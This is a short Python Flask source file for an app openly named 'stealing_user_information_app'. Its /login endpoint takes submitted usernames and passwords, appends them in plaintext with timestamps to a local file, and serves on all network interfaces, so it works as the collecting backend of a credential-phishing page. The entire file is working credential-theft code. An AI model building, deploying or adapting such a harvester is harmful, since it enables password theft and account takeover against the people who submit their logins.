from flask import Flask, request, jsonify
from datetime import datetime

stealing_user_information_app = Flask(__name__)

@stealing_user_information_app.route('/login', methods=['POST'])  # change to handle POST
def login():
    # Get data from form data
    username = request.form.get('username')
    password = request.form.get('password')
    with open("user_information.txt", "a") as f:
        if username and password:
            f.write(f"Username: {username}, Password: {password}, Time: {datetime.now()}\n")
            response = {
                "status": "success",
                "message": "User information recorded."
            }
        else:
            response = {
                "status": "error",
                "message": "No user information found."
            }
    return jsonify(response)

def run_stealing_user_information_app():
    stealing_user_information_app.run(host='0.0.0.0', port=5002)